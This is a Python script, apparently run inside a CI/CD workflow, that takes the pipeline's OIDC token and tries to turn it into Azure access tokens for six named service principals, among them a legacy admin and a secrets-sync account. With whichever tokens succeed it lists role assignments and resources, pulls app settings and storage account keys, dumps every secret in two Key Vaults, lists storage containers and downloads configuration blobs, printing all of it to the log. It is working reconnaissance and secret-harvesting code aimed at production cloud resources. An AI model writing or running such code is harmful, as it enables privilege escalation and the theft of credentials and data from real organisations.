import os, json, base64, urllib.parse, urllib.request, urllib.error, sys, time

TENANT = os.environ.get("AZURE_TENANT_ID", "")
CLIENT = os.environ.get("AZURE_CLIENT_ID", "")
SUB = os.environ.get("AZURE_SUBSCRIPTION_ID", "")
RG = "rg-tbl-platform-prod-sea"
SITE = f"https://management.azure.com/subscriptions/{SUB}/resourceGroups/{RG}/providers/Microsoft.Web/sites/app-tbl-storefront-prod"
SA_CFG = f"https://management.azure.com/subscriptions/{SUB}/resourceGroups/{RG}/providers/Microsoft.Storage/storageAccounts/sttblappcfgprodx3euoz"

def say(*a):
    print(*a, flush=True)

def req(url, method="GET", data=None, headers=None, timeout=35):
    r = urllib.request.Request(url, data=data, method=method, headers=headers or {})
    try:
        with urllib.request.urlopen(r, timeout=timeout) as resp:
            return resp.status, resp.read()
    except urllib.error.HTTPError as e:
        try: return e.code, e.read()
        except Exception: return e.code, b""
    except Exception as e:
        return -1, str(e).encode()

def jb(b):
    try: return json.loads(b)
    except Exception: return None

def claims(tok):
    try:
        p = tok.split(".")[1]; p += "=" * (-len(p) % 4)
        return json.loads(base64.urlsafe_b64decode(p))
    except Exception:
        return {}

OIDC = ""
try:
    u = os.environ["ACTIONS_ID_TOKEN_REQUEST_URL"]
    t = os.environ["ACTIONS_ID_TOKEN_REQUEST_TOKEN"]
    s, b = req(u + "&audience=api://AzureADTokenExchange", headers={"Authorization": "Bearer " + t})
    OIDC = (jb(b) or {}).get("value", "")
    say("[oidc]", s, "len", len(OIDC))
    c = claims(OIDC)
    say("[oidc-sub]", c.get("sub"), "aud", c.get("aud"), "iss", c.get("iss"))
except Exception as e:
    say("[oidc-err]", e)

def mint(client_id, assertion, scope):
    body = urllib.parse.urlencode({
        "client_id": client_id, "grant_type": "client_credentials", "scope": scope,
        "client_assertion_type": "urn:ietf:params:oauth:client-assertion-type:jwt-bearer",
        "client_assertion": assertion,
    }).encode()
    s, b = req(f"https://login.microsoftonline.com/{TENANT}/oauth2/v2.0/token", "POST", body,
               {"Content-Type": "application/x-www-form-urlencoded"})
    j = jb(b) or {}
    return s, j.get("access_token", ""), (j.get("error_description") or j.get("error") or "")[:400]

CANDIDATES = [
    ("tbl-cicd-deployer", "72ff278a-9e71-43ec-bac4-2ca303f8e462"),
    ("tbl-legacy-admin", "891fb158-e02c-4428-a885-53b811f369c0"),
    ("tbl-platform-automation", "462d1c38-4459-48b8-9333-82e389e59514"),
    ("tbl-directory-sync", "7c2e61eb-f928-45cd-99c9-20da958dd216"),
    ("tbl-secrets-sync", "58108da8-044e-4d7e-9a46-92e6179b30be"),
    ("tbl-directory-audit", "2c34300e-1bc0-41e7-9c1e-8b7571d72c72"),
]

TOK = {}
for name, cid in CANDIDATES:
    s, tok, err = mint(cid, OIDC, "https://management.azure.com/.default")
    c = claims(tok)
    say(f"[fic {name}] st={s} len={len(tok)} roles={c.get('roles')} tid={c.get('tid')} oid={c.get('oid')} appid={c.get('appid')} err={err}")
    if tok:
        TOK[name] = tok

def auth(t):
    return {"Authorization": "Bearer " + t}

# subscription read + role assignments
for name in TOK:
    s, b = req(f"https://management.azure.com/subscriptions/{SUB}?api-version=2022-12-01", headers=auth(TOK[name]))
    say(f"[subread {name}] st={s} {b[:140]!r}")

s, b = req(f"https://management.azure.com/subscriptions/{SUB}/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01&$filter=atScope()", headers=auth(TOK.get("tbl-cicd-deployer") or TOK.get("tbl-legacy-admin") or ""))
say("\n[roleAssignments] st", s)
j = jb(b) or {}
for ra in (j.get("value") or []):
    p = ra.get("properties", {})
    say("  RA", p.get("principalId"), p.get("roleDefinitionId", "").split("/")[-1], p.get("scope"))

# resources
s, b = req(f"https://management.azure.com/subscriptions/{SUB}/resources?api-version=2021-04-01&$top=500", headers=auth(TOK.get("tbl-cicd-deployer") or ""))
say("\n[resources] st", s, "len", len(b))
j = jb(b) or {}
for r in (j.get("value") or []):
    say("  RES", r.get("type"), r.get("name"), r.get("location"))

def arm_try(label, tokname, path, method="GET", body=None, base=None):
    base = base or ("https://management.azure.com" + path)
    h = auth(TOK[tokname])
    if body is not None:
        h["Content-Length"] = str(len(body))
        if "json" in h.get("Content-Type", ""): pass
    s, b = req(base, method, body, h)
    say(f"[{label} via {tokname}] st={s} {b[:400]!r}")
    return s, b

for name in TOK:
    arm_try("appsettings-list", name, "", "POST", b"", SITE + "/config/appsettings/list?api-version=2023-12-01")
for name in TOK:
    arm_try("listKeys-cfg", name, "", "POST", b"", SA_CFG + "/listKeys?api-version=2023-01-01")

# get config account key if any token worked
KEY = None
for name in TOK:
    s, b = req(SA_CFG + "/listKeys?api-version=2023-01-01", "POST", b"", auth(TOK[name]))
    j = jb(b) or {}
    if s == 200 and j.get("keys"):
        KEY = j["keys"][0]["value"]; say("[KEY] from", name, len(KEY)); break

# kv data-plane: list all secrets in both vaults with every token (ARM token audience mismatch; need vault token)
VAULTS = ["kv-tbl-prod-x3euoz", "kv-tbl-sec-x3euoz"]
VT = {}
for name, cid in CANDIDATES:
    s, tok, err = mint(cid, OIDC, "https://vault.azure.net/.default")
    if tok: VT[name] = tok
    say(f"[vaulttok {name}] st={s} len={len(tok)} {err[:120]}")

for v in VAULTS:
    for name in VT:
        s, b = req(f"https://{v}.vault.azure.net/secrets?api-version=7.4", headers=auth(VT[name]))
        say(f"[kvlist {v} via {name}] st={s} {b[:300]!r}")
        j = jb(b) or {}
        for item in (j.get("value") or []):
            sid = item.get("id", "")
            s2, b2 = req(sid + "?api-version=7.4", headers=auth(VT[name]))
            say(f"   SECRET {sid.split('/')[-1]} st={s2} {b2[:220]!r}")

# storage data-plane list containers/blobs with each ARM token (AAD)
STOR = ["sttblappcfgprodx3euoz", "sttblbackupprodx3euoz", "sttblarchiveprodx3euoz", "sttblcilogsprodx3euoz"]
ST = {}
for name, cid in CANDIDATES:
    s, tok, err = mint(cid, OIDC, "https://storage.azure.com/.default")
    if tok: ST[name] = tok
    say(f"[stortok {name}] st={s} len={len(tok)} {err[:120]}")

for acct in STOR:
    for name in ST:
        s, b = req(f"https://{acct}.blob.core.windows.net/?comp=list", headers=auth(ST[name]))
        say(f"[contlist {acct} via {name}] st={s} {b[:280]!r}")

# if key: read config blobs
if KEY:
    try:
        from azure.storage.blob import BlobServiceClient
    except Exception:
        os.system(f"{sys.executable} -m pip install -q azure-storage-blob")
        from azure.storage.blob import BlobServiceClient
    cs = f"DefaultEndpointsProtocol=https;AccountName=sttblappcfgprodx3euoz;AccountKey={KEY};EndpointSuffix=core.windows.net"
    try:
        svc = BlobServiceClient.from_connection_string(cs)
        for c in svc.list_containers():
            say("[CFG-CONT]", c.name)
            cc = svc.get_container_client(c.name)
            for bl in cc.list_blobs():
                say("   BLOB", bl.name, bl.size)
                if bl.size < 200000:
                    data = cc.download_blob(bl.name).readall()
                    say("   BODY", data[:3000])
    except Exception as e:
        say("[cfg-read-err]", repr(e))

say("=== RECON3 DONE ===")
